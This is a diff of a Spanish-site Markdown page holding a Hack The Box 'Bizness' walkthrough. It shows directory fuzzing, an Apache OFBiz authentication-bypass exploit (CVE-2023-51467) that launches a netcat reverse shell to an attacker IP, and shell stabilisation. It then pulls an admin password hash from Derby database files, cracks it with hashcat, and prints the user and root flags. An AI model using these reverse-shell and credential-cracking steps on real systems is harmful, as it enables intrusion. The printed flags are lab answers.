@@ -7,14 +7,7 @@ releaseDate: 2023-01-06
 slug: "bizness"
 ---
 
-import Browser from "@/components/browser.astro" 
-
-<br/>
-
-<Browser 
-  src="/example.png"
-  alt="imagen de ejemplo"
-/>
+import Browser from "@/components/Browser.astro" 
 
 ## Enumeration
 
@@ -25,30 +18,95 @@ PORT      STATE SERVICE    REASON         VERSION
 22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
 80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
 443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
-34361/tcp open  tcpwrapped syn-ack ttl 63
 ```
-
-<br/>
 
 ```bash
 echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
 ```
 
-<br/>
+<Browser
+  url="bizness.htb"
+  src="/walkthroughs/bizness-0.png"
+/>
 
 ```bash
-fuzzing
+ffuf -u https://bizness.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 302 --recursion --recursion-depth 2
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://bizness.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 302
+________________________________________________
+
+[INFO] Adding a new job to the queue: https://bizness.htb/accounting/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/ap/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/ar/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/catalog/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/common/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/content/FUZZ
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+[INFO] Adding a new job to the queue: https://bizness.htb/ebay/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/ecommerce/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/example/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/images/FUZZ
+index.html              [Status: 200, Size: 27200, Words: 9218, Lines: 523]
+[INFO] Adding a new job to the queue: https://bizness.htb/marketing/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/passport/FUZZ
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+[INFO] Adding a new job to the queue: https://bizness.htb/common/css/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/common/js/FUZZ
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+control                 [Status: 200, Size: 949, Words: 211, Lines: 37]
+robots.txt              [Status: 200, Size: 23, Words: 1, Lines: 3]
+products                [Status: 200, Size: 530, Words: 55, Lines: 9]
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+favicon.ico             [Status: 200, Size: 17479, Words: 58, Lines: 8]
+[INFO] Adding a new job to the queue: https://bizness.htb/images/icons/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/images/img/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/images/portlets/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/images/products/FUZZ
+[INFO] Adding a new job to the queue: https://bizness.htb/images/rate/FUZZ
+control                 [Status: 200, Size: 34632, Words: 10468, Lines: 492]
+[INFO] Adding a new job to the queue: https://bizness.htb/passport/images/FUZZ
+:: Progress: [4727/4727] :: Job [21/21] :: 525 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
 ```
 
+<Browser
+  url="bizness.htb/accounting/control/main"
+  src="/walkthroughs/bizness-1.png"
+/>
+
 ## Exploitation
+
+[Apache OFBiz](https://ofbiz.apache.org/)
+[CVE-2023-51467](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-51467)
+[poc](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git)
 
 ```bash
 git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
 cd Apache-OFBiz-Authentication-Bypass
-python3 exploit.py --url https://localhost:8443 --cmd 'nc -c bash 10.10.11.252 5000'
+python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.199 5000'
 ```
-
-<br/>
 
 ```bash
 nc -lvnp 5000
@@ -56,44 +114,105 @@ nc -lvnp 5000
 
 ## Post Exploitation
 
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
+
 ```bash
-script /dev/null -c bash
+script /dev/null -qc /bin/bash 
 ```
 
-`ctrl+z`
-
-<br/>
+(inside the nc session) `CTRL+Z`
 
 ```bash
 stty raw -echo; fg
 ```
 
-<br/>
-
+(inside the nc session) 
 ```bash
 reset xterm
 ```
 
-<br/>
+```bash
+export SHELL=/bin/bash; 
+export TERM=screen; 
+stty rows 38 columns 116;
+reset;
+```
 
 ```bash
-export TERM=xterm
+ofbiz@bizness:/opt/ofbiz$ ls ~/
+user.txt
+ofbiz@bizness:/opt/ofbiz$ cat ~/user.txt
+9b7ab7d13e494db670510746dc5731b1
 ```
 
 ##  Privilege escalation
 
+https://db.apache.org/derby/docs/10.13/devguide/cdevdvlp40724.html
+
 ```bash
-hashcat -m 120 -a 0 -d 1 "**********:d" /usr/share/wordlists/rockyou.txt
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt 
+
+# *************************************************************************
+# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
+# *** FILES IN THIS DIRECTORY AND SUBDIRECTORIES CONSTITUTE A DERBY     ***
+# *** DATABASE, WHICH INCLUDES THE DATA (USER AND SYSTEM) AND THE       ***
+# *** FILES NECESSARY FOR DATABASE RECOVERY.                            ***
+# *** EDITING, ADDING, OR DELETING ANY OF THESE FILES MAY CAUSE DATA    ***
+# *** CORRUPTION AND LEAVE THE DATABASE IN A NON-RECOVERABLE STATE.     ***
+# *************************************************************************
 ```
 
-<br/>
+```bash
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ find ./ -type f -exec sh -c 'if strings "{}" 2>/dev/null | grep -q "ofbiz"; then echo "{}"; fi' \; | sort
+
+./c10b0.dat
+./c10c1.dat
+./c10e11.dat
+./c1930.dat
+./c1970.dat
+./c1b90.dat
+./c1ba1.dat
+./c1c10.dat
+./c1c21.dat
+./c1c70.dat
+./c2cb0.dat
+./c2e10.dat
+./c2e21.dat
+./c3ff0.dat
+./c54d0.dat
+./c5990.dat
+./c6010.dat
+./cf1a1.dat
+```
+
+tras revisar los ficheros 1 a 1:
+
+```bash
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ strings ./c54d0.dat | grep admin
+<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445"  enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" >
+userLoginId="admin"
+currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
+```
+
+```bash
+echo "uP0/QaVBpDWFeo8+dRzDqRwXQ2I" | tr "_-" "/+" | base64 -d | xxd -p                                                                                                [21:43:49]
+
+base64: invalid input
+b8fd3f41a541a435857a8f3e751cc3a91c174362
+```
+
+
+```bash
+sudo hashcat -m 120 -a 0 -d 1 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" /usr/share/wordlists/rockyou.txt
+
+b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
+```
 
 ```bash
 su root
 ```
 
-<br/>
-
 ```bash
-cat /root.txt
+cat ~/root.txt
+504e5f94ad46598cc4ac7c09642aaa21
 ```
